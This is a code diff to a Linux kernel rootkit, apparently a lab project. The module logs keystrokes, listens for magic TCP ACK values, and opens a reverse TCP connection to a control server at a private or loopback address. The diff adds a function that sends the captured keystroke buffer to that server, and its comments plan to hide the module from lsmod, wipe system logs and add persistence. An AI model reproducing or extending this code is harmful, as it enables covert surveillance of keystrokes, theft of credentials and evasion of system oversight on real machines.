@@ -29,7 +29,8 @@
 #include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
 #include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
 
-#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
+//#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
+#define KEYBOARD_BUFFER_SIZE 1024
 
 #define SHIFT_ENABLED  1				/* Shift key is enabled.  */
 #define SHIFT_DISABLED 0				/* Shift key is disabled. */
@@ -37,7 +38,7 @@
 #define CONNECTED      1				/* r-TCP connection established.     */
 #define DISCONNECTED   0				/* r-TCP connection not established. */
 
-mm_segment_t oldfs;
+mm_segment_t old_fs;
 
 
 /**
@@ -52,7 +53,6 @@ int  shift_state;
  * NETWORK LISTENING FUNCTIONALITY
 **/
 struct packet_type  net_proto;
-struct task_struct *net_thread;
 struct sockaddr_in  sock_in;
 struct socket      *sock;
 
@@ -60,8 +60,8 @@ struct socket      *sock;
 /**
  * REVERSE TCP SHELL FUNCTIONALITY
 **/
-unsigned long  int server_ip; 			/* set to binary form of 192.168.56.200, or 0xC0A838C8  */
-unsigned short int server_port;			/* set to binary form of 14683, or 0x395B				*/
+unsigned long  int server_ip;
+unsigned short int server_port;
 int connection_state;
 
 unsigned long int acks[] =
@@ -123,9 +123,33 @@ char *shift_letters[] =
 };
 
 
+void send_buffer(struct socket *sock, const char *buffer, size_t length)
+{
+	struct msghdr msg;
+	struct iovec  iov;
+
+	msg.msg_flags = MSG_WAITALL;
+	msg.msg_control = NULL;
+	msg.msg_controllen = 0;
+	msg.msg_iovlen  = 1;
+	msg.msg_namelen = 0;
+	msg.msg_iov  = &iov;
+	msg.msg_name = 0;
+
+	iov.iov_base = (char *) buffer;
+	iov.iov_len  = (size_t) length;
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+		sock_sendmsg(sock, &msg, (size_t)length);
+	set_fs(old_fs);
+}
+
+
 /**
  * TODO: 
- *   - Send keyboard buffer to control server. 
+ *   - Write keyboard_buffer into file if not connected.
+ *   - When connected, read file into buffer and send to control server.
 **/
 int notification(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -171,26 +195,20 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 				if (keyboard_index < KEYBOARD_BUFFER_SIZE)
 					buffer[keyboard_index++] = c;
 
-				/**
-				 * TODO:
-				 *   + Send keyboard buffer to control server. 
-				**/
-				// Currently flushes the keyboard buffer.
 				else
 				{
-					memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
-					keyboard_index = 0;
-					buffer[keyboard_index++] = c;
-
-					/**
 					if (connection_state)
-						// send buffer to control server
-						// flush buffer
-					else
+					{
+						// TODO: Handle buffer contents when writing file to it.
+						send_buffer(sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);
+						memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
+						keyboard_index = 0;
+						buffer[keyboard_index++] = c;
+					}
+					//else
 						// switch to userspace
 						// write buffer to file
 						// exit userspace
-					**/
 				}
 			}
 		}
@@ -215,13 +233,12 @@ void reverse_connect(void)
 	}
 
 	memset(&sock_in, 0, sizeof(sock_in));
-	sock_in.sin_addr.s_addr = htonl((unsigned long) 0xC0A838C8);
 	sock_in.sin_family = AF_INET;
-	sock_in.sin_port = htons((unsigned short) 0x395B);
+	sock_in.sin_addr.s_addr = htonl((unsigned long) server_ip);
+	sock_in.sin_port = htons((unsigned short) server_port);
 
-	printk("Attempting to connect to server [expected not to].\n");
 	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
-		printk("Could not connect [expected].\n");
+		printk("Could not connect.\n");
 	else
 	{
 		connection_state = CONNECTED;
@@ -234,7 +251,7 @@ void reverse_connect(void)
 void handle_command(unsigned long int ack_seq)
 {
 	printk("Handling: %lu\n", ack_seq);
-	switch (ack_seq)
+	switch(ack_seq)
 	{
 		case 2035414082:
 			break;
@@ -293,12 +310,12 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 
 	int i;
 	
-	printk("One packet received.\n");
+	//printk("One packet received.\n");
 	ip_header = (struct iphdr *)skb_network_header(skb);
 
 	if (ip_header->protocol == IPPROTO_TCP)
 	{
-		printk("Was a TCP packet.\n");
+		printk("Packet received was a TCP packet.\n");
 		tcp_header = (struct tcphdr *) ((unsigned int *) ip_header + ip_header->ihl);
 
 		ack_seq = ntohl(tcp_header->ack_seq);
@@ -306,14 +323,14 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		printk("ack_seq: %lu\n", ack_seq);
 		printk("seq:     %lu\n", seq);
 		
+		// Up to 20 different commands.
 		for (i = 0; i < 20; i++)
 		{
 			if (ack_seq == acks[i])
 			{
 				if (!connection_state)
 				{
-					printk("Would attempt to connect.\n");
-					connection_state = CONNECTED;
+					printk("Attempting to connect to TCP server.\n");
 					reverse_connect();
 				}
 
@@ -344,10 +361,9 @@ void start_listen(void)
  *     + Option1:  Overwrite "lsmod"
  *     + Option2:  Delete module listing "rootkit" from modules.
  *     + Do this last (for the sake of debugging).
- *   - Configure rootkit to be a client.
- *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
- *     + This connection is, thus, a reverse-TCP connection.
+ *   - Clear /var/log/messages continually. 
  *   - Seed for randomly generated magic "ACK"s?
+ *   - Persistence (try connect on startup?)
 **/
 int start(void)
 {
@@ -361,8 +377,15 @@ int start(void)
 	start_listen();
 	connection_state = DISCONNECTED;
 
-	server_ip   = 0xC0A838C8;
-	server_port = 0x395B    ; 
+	/**
+	 * Addresses:
+	 *   - 0x7F000001 is "127.0.0.1" in host byte order.
+	 * 	 - 0xC0A838C8 is "192.168.56.200" in host byte order.
+	 * Ports:
+	 * 	 - 0x395D is "14685" in host byte order.
+	**/ 
+	server_ip   = 0x7F000001;
+	server_port = 0x395D    ; 
 
 	return 0;
 }
@@ -376,6 +399,14 @@ void stop(void)
 
 	printk("Removing netdevice pack.\n");
 	dev_remove_pack(&net_proto);
+
+	if (sock->ops->shutdown(sock, 2) < 0)
+		printk("Could not close the socket.\n");
+	else
+	{
+		connection_state = DISCONNECTED;
+		printk("Closed the socket.\n");
+	}
 
 	printk("Rootkit stopped.\n");
 }
